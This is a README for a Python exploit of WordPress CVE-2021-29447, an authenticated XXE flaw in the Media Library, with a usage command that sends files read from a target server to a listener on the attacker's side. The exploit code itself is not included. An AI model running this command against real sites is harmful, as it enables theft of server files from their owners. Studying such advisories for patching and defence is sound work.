
# WordPress CVE-2021-29447 exploit

Exploit WordPress Media Library XML authenticated External Entity Injection (XXE) to exfiltrate files.

Patched in WordPress 5.7.1.

Required valid WordPress credentials to interact with Media Library.

## Usage

```
python3 wordpress-cve-2021-29447.py -l http://LOCAL_IP:PORT -r http://WORDPRESS_URL -u USERNAME -p PASSWORD
```

Script will ask for file path and return requested file.

## Credit

Inspired by [David Utón (M3n0sD0n4ld) ExploitDB](https://www.exploit-db.com/exploits/50304) script.

## Disclaimer

Usage of this for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.

## License

This script is released under the [MIT License](https://opensource.org/licenses/MIT).
